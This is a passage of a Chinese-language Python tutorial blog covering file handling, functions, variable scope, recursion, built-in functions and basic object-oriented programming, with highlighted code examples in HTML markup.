class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  w mode</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;name_list&quot;</span>, mode=<span class="string">&quot;w&quot;</span>)</span><br><span class="line">f.write(<span class="string">&quot;张三\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">&quot;李四\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">&quot;王五\n&quot;</span>)</span><br><span class="line">f.close()</span><br><span class="line"><span class="comment">#  r mode</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;name_list&quot;</span>, mode=<span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(f.read())  <span class="comment"># 读出所有内容</span></span><br><span class="line"><span class="built_in">print</span>(f.readline())  <span class="comment"># 读一行</span></span><br><span class="line"><span class="comment">#  a mode</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;name_list&quot;</span>, mode=<span class="string">&quot;a&quot;</span>)</span><br><span class="line">f.write(<span class="string">&quot;oracle\n&quot;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p><strong>文件循环遍历</strong></p><p>循环遍历时，将文件每一行的数据以列表形式存入line中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;name_list&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    line = line.split()</span><br><span class="line">    age = <span class="built_in">int</span>(line[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> age &gt;= <span class="number">18</span>:</span><br><span class="line">        <span class="built_in">print</span>(line)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>二进制文件操作（图片/视频）</strong><br><img src="https://img1.imgtp.com/2023/08/04/A82bqAtR.png" alt=""></p><p>encodin=None,该参数告诉你的解释器当亲要打开文件的编码，若缺省，则用解释器的默认编码，也就是utf-8<br>图片和视频底层也是二进制，用二进制形式打开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;yuan.png&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    <span class="built_in">print</span>(line)</span><br><span class="line">    </span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;name_list&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">s = <span class="string">&quot;路飞 18&quot;</span></span><br><span class="line">f.write((s.encode(<span class="string">&quot;utf-8&quot;</span>)))</span><br></pre></td></tr></table></figure><p><code>rb</code>    二进制只读<br><code>wb</code>    二进制只写</p><p><strong>其他常用功能</strong><br><code>seek</code>  把操作文件的光标移动到指定位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;name_list&quot;</span>, mode=<span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line">f.seek(<span class="number">11</span>)</span><br><span class="line"><span class="comment"># f.write(&quot;张三 18\n&quot;)</span></span><br><span class="line"><span class="comment"># f.write(&quot;李四 20\n&quot;)</span></span><br><span class="line"><span class="comment"># f.write(&quot;王五 21\n&quot;)</span></span><br><span class="line"><span class="comment"># f.write(&quot;赵六 19\n&quot;)</span></span><br><span class="line"><span class="built_in">print</span>(f.readline())  <span class="comment"># 李四 20</span></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>按字节操作，utf-8编码中中文占三个字节，西欧符号占两个字节，英文和数字占一个字节<br>写文件时会覆盖光标后的文本</p><blockquote><p>经常搭配tell函数使用，其作用是返回当前光标的位置</p></blockquote><p><strong>flush</strong>  把文件从内存buffer里强制刷新到硬盘<br><strong>truncate</strong>  以光标位置截断文件，将光标后数据删除</p><p><strong>其他打开方式（混合模式）</strong><br>w+ 写读：创建一个新文件，可写入文本，也可将写入的内容读出来<br>r+ 读写：能读能写，但都是些在文件最后，类似追加<br>a+ 追加读：写入数据均以追加的形式</p><p><strong>文件修改</strong><br>前面提到的文件修改会将当前光标后的数据替换掉，而我们正常需求一般是在光标位置前插入文本数据。要实现这点，需打开文件后，先将数据读到内存中，添加数据后再重新写入硬盘</p><p><strong>练习</strong><br>编写一个全局文本检索替换脚本<br>要求在命令行中执行<code>python replace.py old_str new_str filename</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">old_str = sys.argv[<span class="number">1</span>]</span><br><span class="line">new_str = sys.argv[<span class="number">2</span>]</span><br><span class="line">filename = sys.argv[<span class="number">3</span>]</span><br><span class="line">f = <span class="built_in">open</span>(filename, mode=<span class="string">&quot;r+&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line"><span class="comment"># 加载到内存</span></span><br><span class="line">data = f.read()</span><br><span class="line">count = data.count(old_str)</span><br><span class="line">new_data = data.replace(old_str, new_str)</span><br><span class="line"><span class="comment"># 清空文件</span></span><br><span class="line">f.seek(<span class="number">0</span>)</span><br><span class="line">f.truncate()</span><br><span class="line"><span class="comment"># 把新内容写入硬盘</span></span><br><span class="line">f.write(new_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;成功替换字符&#x27;<span class="subst">&#123;old_str&#125;</span> to&#x27;<span class="subst">&#123;new_str&#125;</span>，共计<span class="subst">&#123;count&#125;</span>处&#x27;&quot;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/08/04/xa4ZpB2x.png" alt="成功"></p><p>另一种方法：<br>创建一个新文件，将原文件数据按行读入新文件，并加以替换，最后将原文件删除</p><h3 id="函数编程">函数编程</h3><p>特性：</p><ol><li>减少重复代码</li><li>使程序可扩展</li><li>使程序易维护</li></ol><p>基本语法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sayhello</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;hello,my name is <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sayhello(<span class="string">&quot;Oracle&quot;</span>)</span><br></pre></td></tr></table></figure><p>值得注意python中函数形参和实参传入机制与其他编程语言不同，与传入的数据类型（可变 or 不可变有关），可参考<a href="https://blog.csdn.net/qq_37891604/article/details/124528827">Python中变量的本质</a></p><p>python也可使用默认参数调用函数，语法和C++类似，缺省参数定义需在最后。一般按位置关系确定对应关系的参数，但也可指定参数名，指定参数调用时必须放在默认参数之后</p><p><strong>非固定参数</strong><br>若在函数定义时不确定要传入多少参数，可以使用非固定参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">stu_register</span>(<span class="params">name, age, *args, **kwargs</span>):</span><br><span class="line">    <span class="built_in">print</span>(name, age, args, kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># *args 会把多传入的参数变成一个元组的形式</span></span><br><span class="line"><span class="comment"># **kwargs 会把传入的指定参数变成一个字典的形式</span></span><br><span class="line">stu_register(<span class="string">&quot;Oracle&quot;</span>, <span class="number">19</span>, <span class="string">&quot;M&quot;</span>, <span class="string">&quot;IT&quot;</span>, address=<span class="string">&quot;吉林省&quot;</span>)</span><br><span class="line"><span class="comment"># &gt;&gt;&gt;Oracle 19 (&#x27;M&#x27;, &#x27;IT&#x27;) &#123;&#x27;address&#x27;: &#x27;吉林省&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p><strong>函数返回值</strong><br>若想在函数外部想获取函数内部产生的值，可以用return语句将值返回<br>python可同时返回多个值，写成<code>return a,b,c</code><br>其值存放在元组中<code>(a, b, c)</code><br>函数执行到return就代表函数结束，后面的代码不会执行</p><p><strong>全局变量与局部变量</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">1</span>               <span class="comment"># 全局变量</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    b = <span class="number">2</span>           <span class="comment"># 局部变量</span></span><br><span class="line">    <span class="built_in">print</span>(a)        <span class="comment"># 可访问全局变量a,无法访问它内部的c</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        c = <span class="number">3</span>       <span class="comment"># 更局部的变量</span></span><br><span class="line">        <span class="built_in">print</span>(a)    <span class="comment"># 可以访问全局变量a</span></span><br><span class="line">        <span class="built_in">print</span>(b)    <span class="comment"># b对于inner函数来说，就是外部变量</span></span><br><span class="line">        <span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure><p><strong>global</strong>：指定当前变量使用外部的全局变量(直接使用最外层的)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;函数outer调用之前全局变量a的内存地址： &quot;</span>, <span class="built_in">id</span>(a))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">outer</span>():</span><br><span class="line">    a = <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;函数outer调用之时闭包外部的变量a的内存地址： &quot;</span>, <span class="built_in">id</span>(a))</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        <span class="keyword">global</span> a   <span class="comment"># 注意这行</span></span><br><span class="line">        a = <span class="number">3</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;函数inner调用之后闭包内部变量a的内存地址： &quot;</span>, <span class="built_in">id</span>(a))</span><br><span class="line">    inner()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;函数inner调用之后，闭包外部的变量a的内存地址： &quot;</span>, <span class="built_in">id</span>(a))</span><br><span class="line">outer()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;函数outer执行完毕，全局变量a的内存地址： &quot;</span>, <span class="built_in">id</span>(a))</span><br><span class="line"><span class="comment"># 函数outer调用之前全局变量a的内存地址：  494384192</span></span><br><span class="line"><span class="comment"># 函数outer调用之时闭包外部的变量a的内存地址：  494384224</span></span><br><span class="line"><span class="comment"># 函数inner调用之后闭包内部变量a的内存地址：  494384256</span></span><br><span class="line"><span class="comment"># 函数inner调用之后，闭包外部的变量a的内存地址：  494384224</span></span><br><span class="line"><span class="comment"># 函数outer执行完毕，全局变量a的内存地址：  494384256</span></span><br></pre></td></tr></table></figure><p>若有多层嵌套，且仅想使用上一层的变量,可使用<code>nonlocal</code>关键字声明</p><p><strong>递归函数</strong><br>python语言也支持递归函数<br>举例一个简单的高斯求和函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Gaosi</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> n + Gaosi(n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Gaosi(<span class="number">100</span>))</span><br></pre></td></tr></table></figure><p><strong>常用内置函数</strong></p><table><thead><tr><th style="text-align:center">内置函数</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>all()</code></td><td style="text-align:center">遍历整个列表，若所有元素bool值均为true则返回true，反之为false</td></tr><tr><td style="text-align:center"><code>any()</code></td><td style="text-align:center">遍历整个列表，若任一元素bool值为true则返回true，反之为false</td></tr><tr><td style="text-align:center"><code>chr()</code></td><td style="text-align:center">返回指定数字对应ASCII码对应的字符</td></tr><tr><td style="text-align:center"><code>dict()</code></td><td style="text-align:center">生成一个字典，确省则为空字典</td></tr><tr><td style="text-align:center"><code>dir()</code></td><td style="text-align:center">显示对象所有的属性和方法。最棒的辅助函数之一</td></tr><tr><td style="text-align:center"><code>abs()</code></td><td style="text-align:center">返回指定数据的绝对值</td></tr><tr><td style="text-align:center"><code>bin()、oct()、hex()</code></td><td style="text-align:center">三个函数是将十进制数分别转换为2/8/16进制</td></tr><tr><td style="text-align:center"><code>ord()</code></td><td style="text-align:center">与chr()相反，返回某个ASCII字符对应的十进制数</td></tr><tr><td style="text-align:center"><code>divmod()</code></td><td style="text-align:center">除法，同时返回商和余数的元组</td></tr><tr><td style="text-align:center"><code>enumerate()</code></td><td style="text-align:center">枚举函数，在迭代对象的时候，额外提供一个序列号的输出</td></tr><tr><td style="text-align:center"><code>eval()</code></td><td style="text-align:center">将字符串直接解读并执行</td></tr><tr><td style="text-align:center"><code>gloabals()</code></td><td style="text-align:center">列出当前环境下所有的全局变量。注意要与global关键字区分</td></tr><tr><td style="text-align:center"><code>hash()</code></td><td style="text-align:center">为不可变对象，例如字符串生成哈希值的函数</td></tr><tr><td style="text-align:center"><code>help()</code></td><td style="text-align:center">返回对象的帮助文档</td></tr><tr><td style="text-align:center"><code>id()</code></td><td style="text-align:center">返回对象的内存地址,常用来查看变量引用的变化，对象是否相同等</td></tr><tr><td style="text-align:center"><code>isinstance()</code></td><td style="text-align:center">判断一个对象是否是某个类的实例</td></tr><tr><td style="text-align:center"><code>locals()</code></td><td style="text-align:center">返回当前可用的局部变量</td></tr><tr><td style="text-align:center"><code>max()/min()</code></td><td style="text-align:center">返回给定集合里的最大或者最小的元素。可以指定排序的方法</td></tr><tr><td style="text-align:center"><code>reversed()</code></td><td style="text-align:center">反转，逆序对象</td></tr><tr><td style="text-align:center"><code>round()</code></td><td style="text-align:center">四舍五入</td></tr><tr><td style="text-align:center"><code>sum()</code></td><td style="text-align:center">对可迭代的对象求和</td></tr><tr><td style="text-align:center"><code>sorted()</code></td><td style="text-align:center">排序方法。有key和reverse两个重要参数</td></tr></tbody></table><p>有个别遗漏可查看<a href="https://www.liujiangblog.com/course/python/40">python内置函数</a></p><h2 id="进阶知识">进阶知识</h2><h3 id="面向对象编程">面向对象编程</h3><p>面向对象的思想与其他编程语言相同，主要记录一下python独特的语法<br><strong>类和实例</strong><br>Python使用class关键字来定义类，其基本结构如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">类名</span>(<span class="title class_ inherited__">父类列表</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>类名通常采用驼峰式命名方式，尽量让字面意思体现出类的作用。Python采用多继承机制，一个类可以同时继承多个父类（也叫基类、超类），继承的基类有先后顺序，写在类名后的圆括号里。继承的父类列表可以为空，此时的圆括号可以省略。但在Python3中，即使你采用类似class Student:pass的方法没有显式继承任何父类的定义了一个类，它也默认继承object类。因为，object是Python3中所有类的基类。</p><p>下面是一个学生类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    classroom = <span class="string">&#x27;101&#x27;</span></span><br><span class="line">    address = <span class="string">&#x27;beijing&#x27;</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_age</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%s: %s&#x27;</span> % (self.name, self.age))</span><br></pre></td></tr></table></figure><p>可以通过调用类的实例化方法（有的语言中也叫初始化方法或构造函数）来创建一个类的实例。默认情况下，使用类似obj=Student()的方式就可以生成一个类的实例。但是，通常每个类的实例都会有自己的实例变量，例如这里的name和age，为了在实例化的时候体现实例的不同，Python提供了一个def <strong>init</strong>(self):的实例化机制。任何一个类中，名字为__init__的方法就是类的实例化方法，具有__init__方法的类在实例化的时候，会自动调用该方法，并传递对应的参数。比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">li = Student(<span class="string">&quot;李四&quot;</span>, <span class="number">24</span>)</span><br><span class="line">zhang = Student(<span class="string">&quot;张三&quot;</span>, <span class="number">23</span>)</span><br></pre></td></tr></table></figure><p><strong>实例变量和类变量</strong><br>实例变量和类变量<br><strong>实例变量</strong>：<br>实例变量指的是实例本身拥有的变量。每个实例的变量在内存中都不一样。Student类中__init__方法里的name和age就是两个实例变量。通过实例名加圆点的方式调用实例变量。</p><p>我们打印下面四个变量，可以看到每个实例的变量名虽然一样，但他们保存的值却是各自独立的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(li.name)</span><br><span class="line"><span class="built_in">print</span>(li.age)</span><br><span class="line"><span class="built_in">print</span>(zhang.name)</span><br><span class="line"><span class="built_in">print</span>(zhang.age)</span><br><span class="line">------------------------</span><br><span class="line">李四</span><br><span class="line"><span class="number">24</span></span><br><span class="line">张三</span><br><span class="line"><span class="number">23</span></span><br></pre></td></tr></table></figure><p><strong>类变量</strong>：<br>定义在类中，方法之外的变量，称作类变量。类变量是所有实例公有的变量，每一个实例都可以访问、修改类变量。在Student类中，classroom和address两个变量就是类变量。可以通过类名或者实例名加圆点的方式访问类变量，比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Student.classroom</span><br><span class="line">Student.address</span><br><span class="line">li.classroom</span><br><span class="line">zhang.address</span><br></pre></td></tr></table></figure><p>在使用实例变量和类变量的时候一定要注意，使用类似zhang.name访问变量的时候，实例会先在自己的实例变量列表里查找是否有这个实例变量，如果没有，那么它就会去类变量列表里找，如果还没有，弹出异常。</p><p>Python动态语言的特点，让我们可以随时给实例添加新的实例变量，给类添加新的类变量和方法。因此，在使用li.classroom = '102’的时候，要么是给已有的实例变量classroom重新赋值，要么就是新建一个li专属的实例变量classroom并赋值为‘102’。看下面的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">class</span> <span class="title class_">Student</span>:              <span class="comment"># 类的定义体</span></span><br><span class="line">    classroom = <span class="string">&#x27;101&#x27;</span>           <span class="comment"># 类变量</span></span><br><span class="line">    address = <span class="string">&#x27;beijing&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_age</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%s: %s&#x27;</span> % (self.name, self.age))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>li = Student(<span class="string">&quot;李四&quot;</span>, <span class="number">24</span>)        <span class="comment"># 创建一个实例</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>zhang = Student(<span class="string">&quot;张三&quot;</span>, <span class="number">23</span>)     <span class="comment"># 创建第二个实例</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>li.classroom <span class="comment"># li本身没有classroom实例变量，所以去寻找类变量，它找到了！</span></span><br><span class="line"><span class="string">&#x27;101&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>zhang.classroom <span class="comment"># 与li同理</span></span><br><span class="line"><span class="string">&#x27;101&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Student.classroom   <span class="comment"># 通过类名访问类变量</span></span><br><span class="line"><span class="string">&#x27;101&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>li.classroom = <span class="string">&#x27;102&#x27;</span>    <span class="comment"># 关键的一步！实际是为li创建了独有的实例变量，只不过名字和类变量一样，都叫做classroom。</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>li.classroom    <span class="comment"># 再次访问的时候，访问到的是li自己的实例变量classroom</span></span><br><span class="line"><span class="string">&#x27;102&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>zhang.classroom <span class="comment"># zhang没有实例变量classroom，依然访问类变量classroom</span></span><br><span class="line"><span class="string">&#x27;101&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Student.classroom   <span class="comment"># 保持不变</span></span><br><span class="line"><span class="string">&#x27;101&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> li.classroom    <span class="comment"># 删除了li的实例变量classroom</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>li.classroom        <span class="comment"># 一切恢复了原样</span></span><br><span class="line"><span class="string">&#x27;101&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>zhang.classroom</span><br><span class="line"><span class="string">&#x27;101&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Student.classroom</span><br><span class="line"><span class="string">&#x27;101&#x27;</span></span><br></pre></td></tr></table></figure><p>为了防止发生上面的混淆情况，对于类变量，请坚持使用类名.类变量的访问方式，不要用实例去访问类变量。</p><p><strong>封装、继承和多态</strong><br><strong>封装</strong><br>封装的思想不多赘述,只举具体实例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    classroom = <span class="string">&#x27;101&#x27;</span></span><br><span class="line">    address = <span class="string">&#x27;beijing&#x27;</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_age</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%s: %s&#x27;</span> % (self.name, self.age))</span><br><span class="line"></span><br><span class="line">bao = Student(<span class="string">&quot;Oracle&quot;</span>, <span class="number">18</span>)</span><br><span class="line">bao.print_age()</span><br><span class="line"><span class="comment"># 以下是错误的用法</span></span><br><span class="line"><span class="comment"># 类将它内部的变量和方法封装起来，阻止外部的直接访问</span></span><br><span class="line"><span class="built_in">print</span>(classroom)</span><br><span class="line"><span class="built_in">print</span>(adress)</span><br><span class="line">print_age()</span><br></pre></td></tr></table></figure><p><strong>继承</strong><br>继承最大的好处是子类获得了父类的全部变量和方法的同时，又可以根据需要进行修改、拓展。其语法结构如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>(superA, superB,superC....):</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DerivedClassName</span>(modname.BaseClassName):  <span class="comment">## 当父类定义在另外的模块时</span></span><br></pre></td></tr></table></figure><p>Python支持多父类的继承机制，所以需要注意圆括号中基类的顺序，若是基类中有相同的方法名，并且在子类使用时未指定，Python会从左至右搜索基类中是否包含该方法。一旦查找到则直接调用，后面不再继续查找。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 父类定义</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">people</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age, weight</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        self.__weight = weight</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s 说: 我 %d 岁。&quot;</span> % (self.name, self.age))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 单继承示例</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">student</span>(<span class="title class_ inherited__">people</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age, weight, grade</span>):</span><br><span class="line">        <span class="comment"># 调用父类的实例化方法</span></span><br><span class="line">        people.__init__(self, name, age, weight)</span><br><span class="line">        self.grade = grade</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重写父类的speak方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s 说: 我 %d 岁了，我在读 %d 年级&quot;</span> % (self.name, self.age, self.grade))</span><br><span class="line"></span><br><span class="line">s = student(<span class="string">&#x27;ken&#x27;</span>, <span class="number">10</span>, <span class="number">30</span>, <span class="number">3</span>)</span><br><span 